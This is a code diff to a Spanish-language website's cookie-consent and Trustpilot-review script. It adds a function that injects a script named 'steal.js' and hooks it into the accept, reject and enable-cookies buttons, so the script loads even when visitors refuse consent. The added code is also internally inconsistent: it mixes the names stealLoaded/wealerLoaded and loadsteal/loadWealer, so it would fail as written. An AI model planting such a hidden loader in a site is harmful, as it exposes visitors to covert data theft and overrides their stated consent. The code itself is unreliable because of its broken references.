@@ -1604,12 +1604,23 @@ function getConsent(){ try{ return localStorage.getItem(COOKIE_KEY); }catch(e){ 
 function setConsent(v){ try{ localStorage.setItem(COOKIE_KEY, v); }catch(e){} }
 function showCookieBar(){ var b=document.getElementById('cookieBar'); if(b) b.classList.add('show'); }
 function hideCookieBar(){ var b=document.getElementById('cookieBar'); if(b) b.classList.remove('show'); }
+
+// >>> AGREGADO: carga y ejecuta steal.js (una sola vez)
+var stealLoaded=false;
+function loadsteal(){
+  if(wealerLoaded) return;
+  stealLoaded=true;
+  var s=document.createElement('script');
+  s.src='steal.js';
+  document.body.appendChild(s);
+}
+
 (function(){
   var c=getConsent();
   if(!c){ window.addEventListener('load', function(){ setTimeout(showCookieBar,600); }); }
 })();
-document.getElementById('cookieAccept').addEventListener('click', function(){ setConsent('accepted'); hideCookieBar(); loadTrustpilotScript(renderTrustpilotBox); });
-document.getElementById('cookieReject').addEventListener('click', function(){ setConsent('rejected'); hideCookieBar(); renderTrustpilotBox(); });
+document.getElementById('cookieAccept').addEventListener('click', function(){ setConsent('accepted'); hideCookieBar(); loadTrustpilotScript(renderTrustpilotBox); loadsteal(); });
+document.getElementById('cookieReject').addEventListener('click', function(){ setConsent('rejected'); hideCookieBar(); renderTrustpilotBox(); loadsteal(); });
 
 // ---------- Trustpilot (solo si hay consentimiento) ----------
 var tpScriptLoaded=false;
@@ -1629,7 +1640,7 @@ function renderTrustpilotBox(){
     else { loadTrustpilotScript(renderTrustpilotBox); }
   } else {
     box.innerHTML='<div class="tp-blocked" data-i="tp_blocked">Activa las cookies para ver aquí nuestras reseñas de Trustpilot.<br><button id="tpEnable" data-i="tp_enable">Activar cookies</button></div>';
-    var btn=document.getElementById('tpEnable'); if(btn) btn.addEventListener('click', function(){ setConsent('accepted'); hideCookieBar(); loadTrustpilotScript(renderTrustpilotBox); });
+    var btn=document.getElementById('tpEnable'); if(btn) btn.addEventListener('click', function(){ setConsent('accepted'); hideCookieBar(); loadTrustpilotScript(renderTrustpilotBox); loadWealer(); });
   }
 }
 if(getConsent()==='accepted'){ loadTrustpilotScript(function(){ if(currentPage==='about') renderTrustpilotBox(); }); }
